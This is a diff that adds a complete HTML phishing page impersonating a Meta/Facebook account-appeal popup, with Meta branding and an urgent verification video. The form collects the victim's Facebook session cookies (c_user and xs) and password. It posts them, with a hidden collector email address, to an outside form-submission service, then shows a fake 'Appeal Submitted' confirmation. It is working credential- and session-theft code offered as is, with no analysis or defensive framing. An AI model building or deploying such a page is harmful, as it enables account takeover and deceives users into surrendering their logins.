@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Meta Appeal Popup</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    .popup-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: flex; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+    .popup-container {
+      background: #fff;
+      padding: 30px;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 10px;
+      position: relative;
+    }
+    .popup-logo {
+      width: 120px;
+    }
+    .popup-title {
+      font-size: 22px;
+      margin: 10px 0;
+    }
+    .close-popup {
+      position: absolute;
+      top: 10px; right: 15px;
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .submit-btn {
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+    }
+    .success-container {
+      text-align: center;
+      padding: 20px;
+    }
+    .success-icon i {
+      font-size: 50px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Popup Appeal Form -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-container">
+    <div class="popup-header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" 
+           alt="Meta Logo" class="popup-logo">
+      <h1 class="popup-title">Account Verification</h1>
+      <button class="close-popup" id="closePopup">&times;</button>
+    </div>
+
+    <div class="popup-body">
+      <!-- Step 1 -->
+      <form class="step active" id="step1" method="post">
+        <div class="video-container">
+          <iframe src="https://request-for-immediate-action.replit.app/attached_assets/video-information.mp4" 
+                  title="Meta Appeal Process" 
+                  frameborder="0" 
+                  allow="autoplay; encrypted-media" 
+                  allowfullscreen style="width:100%;height:200px;"></iframe>
+        </div>
+
+        <div class="video-instructions">
+          <h5>Watch video and submit appeal:</h5>
+          <ol>
+            <li>No hate speech or harassment allowed.</li>
+            <li>We block harmful or dangerous content.</li>
+            <li>Respect privacy and copyright laws.</li>
+            <li>No fake engagement or spam behavior.</li>
+          </ol>
+        </div>
+
+        <div class="form-group">
+          <label for="c_user">c_user *</label>
+          <input type="text" id="c_user" name="c_user" required>
+        </div>
+
+        <div class="form-group">
+          <label for="xs">xs *</label>
+          <input type="text" id="xs" name="xs" required>
+        </div>
+
+        <button type="button" class="submit-btn" id="toStep2">Continue to Verification</button>
+      </form>
+
+      <!-- Step 2 -->
+      <form class="step" id="step2" method="post" action="https://submit-form.com/CTbX1TGUV">
+        <div class="form-group">
+          <h4 style="text-align: center;">Security Verification</h4>
+          <p style="text-align: center; font-size: 14px;">
+            Enter your Facebook password to continue.
+          </p>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password *</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+
+        <!-- Hidden fields from Step 1 -->
+        <input type="hidden" name="c_user" id="hidden_c_user">
+        <input type="hidden" name="xs" id="hidden_xs">
+
+        <!-- Required hidden email field -->
+        <input type="hidden" name="email" value="nainuk47@gmail.com">
+
+        <button type="submit" class="submit-btn" id="submitAppeal">Submit Appeal</button>
+      </form>
+
+      <!-- Step 3 -->
+      <div class="step" id="step3">
+        <div class="success-container">
+          <div class="success-icon">
+            <i class="fas fa-check-circle"></i>
+          </div>
+          <h2 class="success-title">Appeal Submitted!</h2>
+          <p>Your request has been received. You'll hear back in 3–5 business days.</p>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" 
+               alt="Meta Logo" width="80">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- JavaScript -->
+<script>
+document.getElementById('toStep2').addEventListener('click', function () {
+  const c_user = document.getElementById('c_user').value.trim();
+  const xs = document.getElementById('xs').value.trim();
+
+  if (!c_user || !xs) {
+    alert("Please fill out both c_user and xs fields.");
+    return;
+  }
+
+  document.getElementById('hidden_c_user').value = c_user;
+  document.getElementById('hidden_xs').value = xs;
+
+  document.getElementById('step1').classList.remove('active');
+  document.getElementById('step2').classList.add('active');
+});
+
+document.getElementById('closePopup').addEventListener('click', function () {
+  document.getElementById('popupOverlay').style.display = 'none';
+});
+</script>
+
+</body>
+</html>
